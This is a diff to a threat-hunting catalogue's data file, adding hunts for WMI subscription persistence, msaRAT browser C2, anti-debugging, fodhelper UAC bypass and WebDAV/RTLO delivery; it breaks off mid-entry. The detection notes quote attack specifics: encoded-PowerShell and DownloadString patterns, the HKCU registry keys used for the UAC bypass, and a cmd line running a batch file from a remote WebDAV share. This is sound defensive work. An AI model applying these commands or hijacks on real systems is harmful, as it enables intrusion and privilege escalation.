@@ -951,6 +951,40 @@ const HUNTS_DATA = [
     "created": "2026-07-18T14:13:05-05:00"
   },
   {
+    "id": "B032",
+    "category": "Embers",
+    "title": "Baseline all permanent WMI event subscriptions to surface rogue CommandLine/ActiveScript consumers",
+    "tactic": "Persistence, Privilege Escalation",
+    "notes": "PLATFORM: Windows. BASELINE FIRST (Embers). TRIGGER SOURCE: Rapid7, \"From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery Lab\" (2026-07-20), which listed WMI event subscription as a persistence mechanism in the delivery kit. This baseline is the prerequisite that makes the paired Flame (H241, T1546.003) able to call a subscription \"unexpected.\"\n\nDATA COLLECTION FIELDS (per subscription object): hostname; __EventFilter name + WQL query text (trigger class, e.g. Win32_PerfFormattedData uptime / __InstanceModificationEvent logon / timer); consumer type (CommandLineEventConsumer vs ActiveScriptEventConsumer vs the benign LogFile/NTEventLog types); consumer name; consumer ACTION (CommandLineTemplate / ExecutablePath, or ScriptText/ScriptingEngine); __FilterToConsumerBinding linkage; creating process image + signer + user (from Sysmon EID 1 near the EID 19/20/21 timestamps); creation timestamp; SYSTEM vs user context. TELEMETRY: Sysmon EID 19/20/21, WMI-Activity operational log EIDs 5859-5861, and host inventory via osquery (wmi_event_filters, wmi_consumers, wmi_filter_consumer_bindings) or Get-WmiObject -Namespace root\\subscription.\n\nCOLLECTION WINDOW: 30 days to capture reboot/logon/patch-cycle triggers, plus a one-time full repository sweep of all existing subscriptions (persistence may predate the collection window). DELIVERABLE: a per-environment allowlist of vetted subscriptions keyed on {consumer type, normalized consumer action, creating signer}, plus an inventory of every host carrying a CommandLine/ActiveScript consumer — the triage worklist.\n\nIMMEDIATE FLAGS (do not wait for the baseline to finish): (1) a CommandLineEventConsumer whose action runs powershell/cmd/mshta/wscript/cscript/rundll32, contains `-enc`/`-EncodedCommand`/`DownloadString`/`IEX`, or points at %TEMP%/%APPDATA%/ProgramData or another user-writable path; (2) an ActiveScriptEventConsumer with embedded VBScript/JScript; (3) filter + consumer + binding (EID 19+20+21) all created within the same second by a non-management process; (4) any consumer created by an unsigned or first-seen creator process. CROSS-REF: enables H241 (T1546.003 WMI subscription persistence executing an interpreter/LOLBin); relates to T1047 (WMI) and T1059.001/.005 (the PowerShell/VBScript a malicious consumer runs).",
+    "tags": [
+      "persistence",
+      "privilege_escalation",
+      "windows",
+      "wmi",
+      "event_subscription",
+      "baseline",
+      "fileless",
+      "commandlineeventconsumer",
+      "t1546_003",
+      "t1047",
+      "T1546.003"
+    ],
+    "techniques": [
+      "T1546.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Malicious WMI persistence hides among legitimate management subscriptions, not among noise.** The few products that create permanent subscriptions look structurally similar to an attacker's, so only a vetted allowlist of *which* consumers legitimately exist — keyed on the consumer action and its creating signer — makes a rogue one stand out. That is why this is an Ember, not a Flame.\n- **The repository must be swept, not just watched.** Persistence installed before monitoring began lives silently in the CIM database with no ongoing event; a one-time enumeration of `root\\subscription` across the estate is the only way to find pre-existing implants, which a purely streaming rule never sees.\n- **The volume is low enough to inventory completely.** Permanent subscriptions are rare, so unlike most baselines this one can aim for full coverage — every filter, consumer, and binding — turning the baseline itself into a durable asset inventory.\n- **It is the prerequisite for the persistence Flame.** H241 can only call a consumer \"unexpected\" against this allowlist; without the baseline, every SCCM or monitoring subscription is a false positive and the Flame is unusable.",
+    "references": "- [MITRE ATT&CK T1546.003: Event Triggered Execution — Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)\n- [Rapid7: From a Single Alert to 1,000 Files — Inside an Exposed WebDAV Malware Delivery Lab](https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/)\n- [TrustedSec: Sysmon Community Guide — WMI Events (19/20/21)](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/WMI-events.md)\n- [in.security: An Intro into Abusing and Identifying WMI Event Subscriptions for Persistence](https://in.security/2019/04/03/an-intro-into-abusing-and-identifying-wmi-event-subscriptions-for-persistence/)\n- [osquery schema: wmi_event_filters / wmi_consumers / wmi_filter_consumer_bindings](https://osquery.io/schema/current)\n- [Splunk Security Content: WMI Permanent Event Subscription — Sysmon](https://research.splunk.com/endpoint/ad05aae6-3b2a-4f73-af97-57bd26cee3b9/)",
+    "file_path": "Embers/B032.md",
+    "created": "2026-07-25T22:17:55-05:00"
+  },
+  {
     "id": "H001",
     "category": "Flames",
     "title": "An adversary is attempting to brute force the admin account on the externally facing VPN gateway.",
@@ -8165,6 +8199,182 @@ const HUNTS_DATA = [
     "created": "2026-07-24T22:31:35-04:00"
   },
   {
+    "id": "H240",
+    "category": "Flames",
+    "title": "Chaos msaRAT headless browser C2 after MSI staging",
+    "tactic": "Execution, Stealth, Command and Control",
+    "notes": "Endpoint process telemetry - Core filter: `curl.exe` writing `C:\\ProgramData\\update_ms.msi` or `msiexec.exe` executing an MSI from `C:\\ProgramData`. Triage values: `process command line`, `parent process command line`, `file path`, `user`, `host`. Pivot: look for `msiexec.exe` custom action behavior and follow-on DLL load from the same installer window. Strong red flags: plain `http://` transfer on port `443`, `update_ms.msi`, and staging outside a managed software deployment path.\n\nModule and browser launch telemetry - Core filter: MSI execution followed by `lib.dll` load and Chrome or Edge launched by a non-browser parent. Triage values: `loaded module path`, `process command line`, `parent process name`, `parent process command line`. Pivot: search for browser flags such as `--headless`, `--remote-debugging-port`, `--remote-debugging-address`, and Chrome or Edge started from an unusual parent after the MSI runs. Strong red flags: a newly launched headless browser with a local debugging port immediately after `msiexec.exe` activity.\n\nLocal browser control telemetry - Core filter: a non-browser process connecting to `127.0.0.1` on the browser debugging port, then issuing CDP style paths or WebSocket control. Triage values: `source process`, `destination IP address`, `destination port`, `process command line`, `user`. Pivot: correlate local debugging connections with browser-owned requests to `/json/list/`, `Target.createTarget`, `Page.setBypassCSP`, `Runtime.addBinding`, or `Runtime.evaluate`. Strong red flags: callbacks or binding names such as `msaOpen`, `msaClose`, `msaError`, `msaMessage`, or `dataAck`.\n\nProcess-owned network telemetry - Core filter: headless Chrome or Edge making external signaling and WebRTC traffic shortly after local RAT execution. Triage values: `process name`, `process command line`, `destination domain`, `destination IP address`, `user agent`, `parent process name`. Correlation: browser traffic to `workers.dev` style signaling, `HeadlessChrome` user agent, then TURN relay traffic such as `global.turn.twilio.com` after a local debugging session. False positive: browser automation and QA systems can use remote debugging, but they should not follow `curl.exe` MSI staging, `lib.dll` load, and local malware-to-browser control on an end-user host.\n",
+    "tags": [
+      "chaos_ransomware",
+      "msarat",
+      "chrome_devtools_protocol",
+      "webrtc",
+      "msi",
+      "headless_browser",
+      "T1105",
+      "T1218.007",
+      "T1059.003",
+      "T1090",
+      "T1071.001"
+    ],
+    "techniques": [
+      "T1105",
+      "T1218.007",
+      "T1059.003",
+      "T1090",
+      "T1071.001"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Joshua Strickland",
+      "link": "https://novasky.io"
+    },
+    "why": "- Talos tied this behavior to active Chaos ransomware operations and named concrete artifacts: `update_ms.msi`, `C:\\ProgramData\\update_ms.msi`, `lib.dll`, and CDP binding names such as `msaOpen` and `msaMessage`.\n- The hunt survives IP and domain rotation because the RAT still has to stage an MSI, load the embedded DLL, start a headless browser, and control it through a local debugging channel.\n- MDR teams can observe the chain with standard endpoint telemetry: process creation, file creation, module loads, browser command lines, localhost connections, and process-owned network metadata.\n- False positives are controllable because benign browser automation is not expected to appear immediately after `curl.exe` writes an MSI into `ProgramData` and `msiexec.exe` loads a payload DLL.",
+    "references": "- [Cisco Talos: Chaos ransomware msaRAT browser C2](https://blog.talosintelligence.com/chaos-msarat-living-off-the-browser-to-build-covert-c2-channel/)\n- [MITRE ATT&CK T1105 Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105/)\n- [MITRE ATT&CK T1218.007 Msiexec](https://attack.mitre.org/techniques/T1218/007/)\n- [MITRE ATT&CK T1090 Proxy](https://attack.mitre.org/techniques/T1090/)\n- [MITRE ATT&CK T1071.001 Web Protocols](https://attack.mitre.org/techniques/T1071/001/)",
+    "file_path": "Flames/H240.md",
+    "created": "2026-07-24T22:31:47-04:00"
+  },
+  {
+    "id": "H241",
+    "category": "Flames",
+    "title": "WMI permanent event subscription persistence executing a script interpreter or LOLBin",
+    "tactic": "Persistence, Privilege Escalation",
+    "notes": "PLATFORM: Windows. TRIGGER SOURCE: Rapid7, \"From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware\nDelivery Lab\" (2026-07-20), which flagged WMI event subscription as a persistence mechanism in the delivery kit\n(alongside scheduled tasks `brokerhost`/`net_queue_32` and a Run key). HEARTH had no coverage for T1546.003; this\nhunt generalizes the technique with the well-established WMI persistence detection stack.\n\nATTACK MECHANICS: persistence lives in the WMI/CIM repository, not on disk. Three objects are required and Sysmon\nlogs each: __EventFilter (EID 19 — inspect the WQL, e.g. a trigger on `Win32_PerfFormattedData_PerfOS_System`\nuptime 200-320s or on logon), an EventConsumer (EID 20 — the two abused types are CommandLineEventConsumer, which\nruns a command, and ActiveScriptEventConsumer, which runs embedded VBScript/JScript), and a\n__FilterToConsumerBinding (EID 21). Execution is brokered by trusted WmiPrvSE.exe (and scrcons.exe for script\nconsumers), typically inheriting SYSTEM.\n\nDETECTION SIGNALS (Windows):\n- Temporal correlation: Sysmon EID 19 + 20 + 21 created within the same second/minute = a subscription deployed.\n- EID 20 CommandLineEventConsumer/ActiveScriptEventConsumer whose action contains powershell/cmd/mshta/wscript,\n  `-enc`/`-EncodedCommand`, DownloadString/IEX, or a path under %TEMP%/%APPDATA%/ProgramData.\n- WMI-Activity operational log EIDs 5859-5861 as a corroborating/second source where Sysmon isn't deployed.\n- Sysmon EID 7: WmiPrvSE.exe loading wbemcons.dll (CommandLineEventConsumer runtime), or EID 1: scrcons.exe /\n  WmiPrvSE.exe spawning an interpreter under SYSTEM with an anomalous parent.\n- Host inventory via osquery tables wmi_event_filters / wmi_consumers / wmi_filter_consumer_bindings.\n\nCROSS-REF: pair with B032 (baseline of legitimate permanent WMI subscriptions) — you cannot call a consumer\n\"unexpected\" without that allowlist, so B032 is the prerequisite for this Flame. Also cross-ref T1047 (WMI) for\nthe broader abuse of the WMI service, and T1059.001/.005 for the PowerShell/VBScript the consumer executes.\n",
+    "tags": [
+      "persistence",
+      "privilege_escalation",
+      "windows",
+      "wmi",
+      "event_subscription",
+      "fileless",
+      "commandlineeventconsumer",
+      "activescripteventconsumer",
+      "t1546_003",
+      "t1047",
+      "T1546.003"
+    ],
+    "techniques": [
+      "T1546.003"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **Fileless and SYSTEM-context by design.** The persistence lives in the CIM repository, not the filesystem, and executes through a trusted broker, so disk-based and signature detections miss it — creation telemetry (Sysmon 19/20/21) is the reliable catch point.\n- **The telemetry is nearly noise-free.** Permanent WMI subscriptions are rare outside a handful of management tools, so a log-all approach with a small allowlist yields high-fidelity alerts rather than a flood.\n- **Temporal correlation is a strong, durable signal.** Filter + consumer + binding created within the same second is a structural fingerprint of the technique that survives payload and infrastructure changes.\n- **It pairs with a concrete baseline.** The one false-positive source — legitimate management subscriptions — is exactly what B032 inventories, so the two hunts together turn \"any subscription\" into \"any subscription not on the allowlist.\"",
+    "references": "- [MITRE ATT&CK T1546.003: Event Triggered Execution — Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)\n- [Rapid7: From a Single Alert to 1,000 Files — Inside an Exposed WebDAV Malware Delivery Lab](https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/)\n- [SigmaHQ: WMI Event Subscription (sysmon_wmi_event_subscription.yml)](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/wmi_event/sysmon_wmi_event_subscription.yml)\n- [Splunk Security Content: Detect WMI Event Subscription Persistence](https://research.splunk.com/endpoint/01d9a0c2-cece-11eb-ab46-acde48001122/)\n- [TrustedSec: Sysmon Community Guide — WMI Events (19/20/21)](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/WMI-events.md)\n- [Detect.FYI: Hunting WMI Event Subscription Persistence](https://detect.fyi/hunting-wmi-event-subscription-persistence-f087900029f4)",
+    "file_path": "Flames/H241.md",
+    "created": "2026-07-25T22:17:55-05:00"
+  },
+  {
+    "id": "H242",
+    "category": "Flames",
+    "title": "Malware self-debugging and debug-register / debugger-process checks to block analysis (I2PRAT, PikaBot)",
+    "tactic": "Defense Evasion",
+    "notes": "PLATFORM: Windows. Sources: Sekoia TDR, \"RATatouille: Cooking Up Chaos in the I2P Kitchen\" (I2PRAT) and Sekoia\nTDR, \"PikaBot: a Guide to its Deep Secrets and Operations.\" Both malware families gate execution on\nanti-analysis, and both surfaced T1622 as an uncovered gap.\n\nATTACK MECHANICS — two complementary approaches observed:\n1. I2PRAT self-debugging: the loader creates a debug object and attaches to its own newly spawned installer\n   process so a debugger cannot attach, using NtCreateDebugObject, NtDebugActiveProcess, NtWaitForDebugEvent,\n   NtDebugContinue, and waiting on DbgCreateProcessStateChange to keep the child pending. It also duplicates an\n   elevated SYSTEM process handle (NtDuplicateObject, PROCESS_ALL_ACCESS) and spawns a child with\n   PROCESS_CREATE_FLAGS_INHERIT_HANDLES, spoofing the parent PID as a child of winlogon.exe, then injects via\n   thread execution hijacking (observed \"duplicates itself from process ID 6028 to 8912\").\n2. PikaBot active checks: reads debug registers through the thread context via GetThreadContext (\"non-zero values\n   in any of these registers may indicate a debugger\"), carries CheckRemoteDebuggerPresent and a debug_flag in\n   its stage-2 struct, and enumerates processes with CreateToolhelp32Snapshot / Process32First / Process32Next\n   against an RC4-encrypted ban list (x32dbg.exe, x64dbg.exe, windbg.exe, ImmunityDebugger.exe, idaq/idaq64.exe,\n   Fiddler.exe, \"Wireswhar.exe\", dumpcap.exe, ProcessHacker.exe, procmon.exe, tcpview.exe, cheatengine variants),\n   terminating on a match. Since Feb 2024 it uses direct syscalls (SysWhispers2) including ZwSystemDebugControl /\n   NtSystemDebugControl to bypass ntdll userland hooks. (Related: Rapid7's PureRAT WebDAV payload calls\n   IsDebuggerPresent and FailFast if monitored, and checks COR_PROFILER — the same defensive gate.)\n\nDETECTION SIGNALS (Windows):\n- Sysmon EID 10 (ProcessAccess): SourceImage (unsigned/new) opening a TargetImage it just created with access\n  masks granting debug/duplicate rights; or self-open. GrantedAccess like 0x1FFFFF (PROCESS_ALL_ACCESS).\n- Sysmon EID 1: a child created SUSPENDED whose ParentImage is spoofed (winlogon.exe) but whose real creator is a\n  loader in %TEMP%/%APPDATA%; correlate CreationTime vs the debug-object access.\n- ETW-TI (if surfaced by the EDR): NtCreateDebugObject/NtDebugActiveProcess against an own child, NtSetContextThread\n  + NtResumeThread (thread hijack), ZwSystemDebugControl from a non-debugger.\n- Behavioral bundle: banned-analyst-process enumeration (Toolhelp snapshot) immediately followed by self-exit, or\n  debug checks immediately followed by CreateRemoteThread/process tampering (EID 8/25).\n\nCROSS-REF: T1497.001 (System Checks — the banned-process/sandbox enumeration is the sibling anti-analysis gate);\nT1055.003/.012 (thread execution hijacking / process hollowing that these loaders run once the anti-debug gate\npasses); T1106 (Native API — the Nt*/Zw* direct-syscall usage that carries the checks).\n",
+    "tags": [
+      "defense_evasion",
+      "windows",
+      "debugger_evasion",
+      "anti_analysis",
+      "anti_debugging",
+      "i2prat",
+      "pikabot",
+      "process_injection",
+      "t1622",
+      "t1497_001",
+      "T1622"
+    ],
+    "techniques": [
+      "T1622"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The check runs before the payload, so catching it interdicts everything downstream.** Both loaders decide whether to detonate based on the anti-debug gate; the injection, C2, and persistence only happen if the gate passes — so the anti-analysis behavior is the earliest reliable catch point.\n- **Self-debugging is anomalous by construction.** A short-lived, unsigned process creating a debug object and attaching to a child it just spawned (with a spoofed `winlogon.exe` parent) is not something benign software does — it is the technique's fingerprint, independent of the C2 or payload.\n- **The banned-process scan is a distinctive tell.** A `CreateToolhelp32Snapshot` walk that matches on `x64dbg`/`windbg`/`procmon`/`wireshark` and is immediately followed by self-termination is a behavioral signature that survives sample changes.\n- **Direct syscalls signal deliberate evasion.** `ZwSystemDebugControl`/`NtSetContextThread` issued via SysWhispers-style direct syscalls (bypassing ntdll hooks) from a non-debugger is itself suspicious and, where ETW-TI is available, directly observable.",
+    "references": "- [MITRE ATT&CK T1622: Debugger Evasion](https://attack.mitre.org/techniques/T1622/)\n- [Sekoia TDR: RATatouille — Cooking Up Chaos in the I2P Kitchen (I2PRAT)](https://www.sekoia.com/blog/ratatouille-cooking-up-chaos-in-the-i2p-kitchen)\n- [Sekoia TDR: PikaBot — a Guide to its Deep Secrets and Operations](https://www.sekoia.com/blog/pikabot-a-guide-to-its-deep-secrets-and-operations)\n- [Check Point Anti-Debug Reference: Debug Objects & Debugger Detection](https://anti-debug.checkpoint.com/)\n- [Unprotect Project: Anti-Debugging Techniques](https://unprotect.it/category/anti-debugging/)\n- [MITRE ATT&CK T1497.001: Virtualization/Sandbox Evasion — System Checks](https://attack.mitre.org/techniques/T1497/001/)",
+    "file_path": "Flames/H242.md",
+    "created": "2026-07-25T22:17:55-05:00"
+  },
+  {
+    "id": "H243",
+    "category": "Flames",
+    "title": "UAC bypass via auto-elevating binary and HKCU shell-open-command hijack (fodhelper / computerdefaults / wsreset)",
+    "tactic": "Privilege Escalation, Defense Evasion",
+    "notes": "PLATFORM: Windows. SOURCE: Rapid7, \"From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery\nLab\" (2026-07-20). The recovered kit's Tier-5 test set included `I49_fodhelper.url`, `I50_computerdefaults.url`,\nand `I52_wsreset.url`, and the DlrtyGames chain performed COM auto-elevation through dllhost.exe; the final\npayload was PureRAT 4.4.3. HEARTH had no T1548.002 coverage.\n\nATTACK MECHANICS: UAC bypass here is logic abuse, not memory corruption. Auto-elevating Microsoft binaries\n(marked autoElevate=true) launch to high integrity without a prompt and then open a handler resolved via the\nregistry. fodhelper/computerdefaults look up `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`; because HKCU\nis checked before HKCR and is user-writable, a medium-integrity process pre-populates that key (often with a\n`DelegateExecute` value) so the elevated binary runs the attacker's command as high integrity. Sibling keys:\n`HKCU\\Software\\Classes\\mscfile\\shell\\open\\command` (eventvwr), `HKCU\\Software\\Classes\\Folder\\shell\\open\\command`\nand `exefile\\shell\\runas\\command\\IsolatedCommand` (sdclt), `HKCU\\Environment` windir hijack (SilentCleanup).\n\nDETECTION SIGNALS (Windows):\n- Sysmon EID 13: value set on `HKCU\\Software\\Classes\\{ms-settings|mscfile|Folder}\\...\\shell\\open\\command` or a\n  `DelegateExecute` value — capture in real time, since operators often delete the key immediately after (a\n  point-in-time registry scan misses it). SwiftOnSecurity Sysmon config covers these paths by default.\n- Sysmon EID 1 / 4688: fodhelper.exe / computerdefaults.exe / eventvwr.exe / sdclt.exe / wsreset.exe (or\n  dllhost.exe COM surrogate) spawning cmd/powershell/mshta/rundll32 or an unsigned binary — a Medium→High\n  integrity transition with NO preceding consent.exe. \"A legitimate fodhelper.exe should never spawn a shell.\"\n- Correlation rule: any HKCU\\Software\\Classes\\...\\command write within ~5 min BEFORE an auto-elevating binary\n  launches. Then trace the high-integrity session for LSASS access, service install (7045), or encoded PowerShell.\n- Evasion watch: Sysmon EID 12/14 registry symbolic-link creation with value name `SymbolicLinkValue` (UACME\n  >=3.5 uses a symlink+rename to dodge shell-open-command monitoring).\n\nCROSS-REF: T1112 (Modify Registry — the HKCU hijack is the registry-write half); T1055 (the PureRAT payload this\nbypass elevates then injects); the same Rapid7 lab drives H240 (T1036.007 delivery) and H241/B032 (WMI\npersistence) — different stages of one intrusion.\n",
+    "tags": [
+      "privilege_escalation",
+      "defense_evasion",
+      "windows",
+      "uac_bypass",
+      "fodhelper",
+      "computerdefaults",
+      "registry_hijack",
+      "purerat",
+      "t1548_002",
+      "t1112",
+      "T1548.002"
+    ],
+    "techniques": [
+      "T1548.002"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The footprint is narrow and well-known — that's the defender's edge.** The technique reduces to one registry-key family plus an auto-elevating binary spawning an unexpected child, so a tight rule catches the whole UACME family without drowning in noise.\n- **Registry writes must be caught in flight.** Operators frequently delete the `shell\\open\\command` key right after elevation, so real-time Sysmon EID 13 capture — not a point-in-time scan — is what preserves the payload-bearing evidence.\n- **Process lineage is a hard behavioral invariant.** `fodhelper.exe` or `computerdefaults.exe` never legitimately spawns `cmd`/`powershell`; a Medium→High integrity jump with no preceding `consent.exe` prompt is a structural anomaly that survives payload changes.\n- **It gates the expensive post-exploitation.** UAC bypass is the doorway to credential dumping, service install, and tamper of security tools; catching the elevation denies the operator high-integrity actions before they start.",
+    "references": "- [MITRE ATT&CK T1548.002: Abuse Elevation Control Mechanism — Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002/)\n- [Rapid7: From a Single Alert to 1,000 Files — Inside an Exposed WebDAV Malware Delivery Lab](https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/)\n- [Elastic Security Labs: Exploring Windows UAC Bypasses — Techniques and Detection Strategies](https://www.elastic.co/security-labs/exploring-windows-uac-bypasses-techniques-and-detection-strategies)\n- [Splunk Security Content: FodHelper UAC Bypass](https://research.splunk.com/endpoint/909f8fd8-7ac8-11eb-a1f3-acde48001122/)\n- [Atomic Red Team: T1548.002 — Bypass User Account Control](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548.002/T1548.002.md)\n- [hfiref0x/UACME: Defeating Windows User Account Control (technique catalogue)](https://github.com/hfiref0x/UACME)",
+    "file_path": "Flames/H243.md",
+    "created": "2026-07-25T22:17:55-05:00"
+  },
+  {
+    "id": "H244",
+    "category": "Flames",
+    "title": "Double-extension / RTLO-spoofed payloads delivered from a WebDAV share via search-ms",
+    "tactic": "Defense Evasion",
+    "notes": "PLATFORM: Windows. Source: Rapid7, \"From a Single Alert to 1,000 Files: Inside an Exposed WebDAV Malware Delivery\nLab\" (2026-07-20), which recovered an operator's staging server full of bulk-generated lures. Final payload in\nboth observed chains was PureRAT 4.4.3 (build tag 06x12x2026SantaEbash2).\n\nATTACK MECHANICS (from the report): a JavaScript-triggered search-ms URI opens a WebDAV share filtered to a single\nextension — e.g. `search-ms:displayname=Search Results in \\\\onedrive.cv@80\\Downloads\\CURP&query=*.scr` — so the\nvictim sees what looks like a local search result. The lures follow a systematic naming scheme\n`HyperPackSetup.<method>.<trick>.<spoof>.lnk`, and the primary document lure was `ReportFinal.rcs.pdf`, an\nRTLO-masqueraded .scr. The report explicitly lists three spoofing tricks stacked together: RTLO (U+202E), double\nextensions, and whitespace padding before .exe / .scr. Sibling delivery vectors in the same kit: UNC paths,\nlibrary-ms, Control Panel items, and LOLBin proxies (iediagcmd.exe, CustomShellHost.exe, OfficeC2RClient.exe).\n\nDETECTION SIGNALS (Windows):\n- Sysmon EID 11 (File Create) for files landing in Downloads/%TEMP% whose name contains U+202E, homoglyph\n  characters in the extension, or a double extension where the TRUE trailing extension is .lnk/.scr/.exe/.js.\n- WebClient service starting (svchost -k WebClientGroup / System 7036 \"WebClient → Running\") on a host that does\n  not normally mount WebDAV, immediately followed by:\n- Sysmon EID 1: `rundll32.exe C:\\Windows\\system32\\davclnt.dll,DavSetCookie <host>@<port> http://<host>:<port>/`\n  (SysWOW64 variant too) — the WebDAV client fetching content — with Sysmon EID 3 to a first-seen/external host.\n- Process lineage: explorer.exe → the spoofed .lnk/.scr, or cmd.exe `/c \\\\<host>@SSL\\DavWWWRoot\\new.bat`, or a\n  decoy .pdf opened from the same DavWWWRoot path while the real payload executes.\n- Parse recovered .lnk with LECmd: RelativePath / WorkingDir pointing at `\\\\<host>@<port>\\DavWWWRoot\\files`.\n\nCROSS-REF: pair with T1036.002 (Right-to-Left Override — the RTLO half of the same spoof), T1204.002 (Malicious\nFile — the user double-click this hunt depends on), and T1055 (the report's PureRAT injects into a signed Qihoo\n360 process after landing). H243 (T1548.002 UAC bypass) and the WMI-persistence hunts (H241/B032) cover the\npost-execution stages of the same intrusion set.\n",
+    "tags": [
+      "defense_evasion",
+      "windows",
+      "masquerading",
+      "double_extension",
+      "rtlo",
+      "webdav",
+      "search_ms",
+      "initial_access",
+      "purerat",
+      "t1036_007",
+      "t1036_002",
+      "t1204_002",
+      "T1036.007"
+    ],
+    "techniques": [
+      "T1036.007"
+    ],
+    "severity": null,
+    "status": "current",
+    "related_hunt_ids": [],
+    "submitter": {
+      "name": "Lauren Proehl",
+      "link": "https://x.com/jotunvillur"
+    },
+    "why": "- **The spoof is the whole point of the click.** Users are trained to trust `.pdf`; the double extension + RTLO makes a `.scr`/`.lnk` read as a document in Explorer and the search-ms window, so catching the filename shape catches the technique before execution, not after.\n- **WebDAV delivery leaves a narrow, low-base-rate trail.** `rundll32.exe` loading `davclnt.dll,DavSetCookie` to a first-seen external host, and the WebClient service starting on a machine that never uses WebDAV, are sharp signals once sanctioned DAV endpoints are baselined out.\n- **The artifact survives infrastructure rotation.** RTLO bytes, homoglyphs, and a hidden true-executable extension are properties of the lure itself — they persist even when the operator changes C2 IPs, so a filename-shape hunt is durable where an IOC block-list is not.\n- **It sits at initial access, upstream of everything expensive.** The same lab's chains end in PureRAT with process injection, UAC bypass, and persistence; interdicting the spoofed-file delivery denies the operator every later stage in one place.",
+    "references": "- [MITRE ATT&CK T1036.007: Masquerading — Double File Extension](https://attack.mitre.org/techniques/T1036/007/)\n- [Rapid7: From a Single Alert to 1,000 Files — Inside an Exposed WebDAV Malware Delivery Lab](https://www.rapid7.com/blog/post/tr-exposed-webdav-malware-delivery-lab-analysis/)\n- [Micah Babinski: Search-ms, WebDAV, and Chill — Detecting a [Re-]emerging Initial Access Technique](https://micahbabinski.medium.com/search-ms-webdav-and-chill-99c5b23ac462)\n- [dfir.ch: Abusing the \"search-ms\" URI Protocol Handler](https://dfir.ch/posts/search-ms_protocol_handler/)\n- [SigmaHQ / Detection.FYI: Suspicious WebDav Client Execution Via Rundll32.EXE](https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_rundll32_webdav_client_susp_execution/)\n- [Splunk Security Content: Windows Rundll32 WebDav With Network Connection](https://research.splunk.com/endpoint/f03355e0-28b5-4e9b-815a-6adffc63b38c/)\n- [MITRE ATT&CK T1036.002: Masquerading — Right-to-Left Override](https://attack.mitre.org/techniques/T1036/002/)",
+    "file_path": "Flames/H244.md",
+    "created": "2026-07-25T22:17:55-05:00"
+  },
+  {
     "id": "M001",
     "category": "Alchemy",
     "title": "A machine learning model can detect anomalies in user login patterns that indicate compromised accounts.",
@@ -8865,5 +9075,41 @@ const HUNTS_DATA = [
     "references": "- [MITRE ATT&CK T1213.004: Data from Information Repositories — Customer Relationship Management Software](https://attack.mitre.org/techniques/T1213/004/)\n- [Microsoft Security Blog: Defending SaaS-based applications against ShinyHunters OAuth abuse](https://www.microsoft.com/en-us/security/blog/2026/07/13/defending-saas-based-applications-against-shinyhunters-oauth-abuse/)\n- [Google Cloud / Mandiant: The Cost of a Call — From Voice Phishing to Data Extortion (UNC6040)](https://cloud.google.com/blog/topics/threat-intelligence/voice-phishing-data-extortion)\n- [AppOmni: Detecting ShinyHunters/UNC6040 Vishing in Salesforce OAuth Attacks](https://appomni.com/blog/detecting-unc6040-vishing-in-salesforce-oauth-attacks/)\n- [Salesforce: Real-Time Event Monitoring — ReportExport and API events](https://help.salesforce.com/s/articleView?id=sf.real_time_event_monitoring_overview.htm)\n- [Elastic Security Labs: Microsoft Entra ID OAuth Phishing and Detections](https://www.elastic.co/security-labs/entra-id-oauth-phishing-detection)",
     "file_path": "Alchemy/M028.md",
     "created": "2026-07-18T14:13:05-05:00"
+  },
+  {
+    "id": "M029",
+    "category": "Alchemy",
+    "title": "Anomalous mail-data egress volume from the webmail tier to first-seen external domains (Zimbra XSS exfil)",
+    "tactic": "Exfiltration",
+    "notes": "ALCHEMY ANALYTIC — per-server / per-user volumetric + first-seen-destination anomaly detection on webmail egress. PLATFORM: Linux (Zimbra Collaboration Suite mail servers) and the network/proxy tier in front of webmail. Sources: Unit 42, \"Russian Global Webmail Espionage\" (2026-07-23, tracked as CL-STA-1114 / Void Blizzard / LAUNDRY BEAR), and CISA advisory AA26-204A (Russian state-sponsored phishing targeting Zimbra users, 2026-07-23). The intrusion set exploited CVE-2025-66376 via a phishing email carrying an HTML attachment with an obfuscated Base64 script; observed dwell time averaged ~35 days. Note: Unit 42 does NOT corroborate the Sednit/APT28 attribution some press applied; it tracks the actor as Void Blizzard / LAUNDRY BEAR.\n\nWHY MODEL-ASSISTED (not a static rule): webmail servers make outbound web requests constantly (federation, link previews, integrations), and the XSS payload runs inside a legitimate authenticated session, so exfil traffic is camouflaged. Attackers also pace collection over weeks. The separating signal is deviation from a given server's or user's own egress envelope plus destination novelty — a volumetric/behavioral problem, not a signature. The actor's transport protocol/port and exact volume were NOT published, so a threshold tuned to one campaign will not generalize; per-entity baselining will.\n\nDATA SOURCES / FIELDS: web proxy / NGFW / NetFlow-IPFIX egress from the webmail subnet (bytes_out, dest domain/IP, dest port, request count, TLS SNI, HTTP host + user-agent); 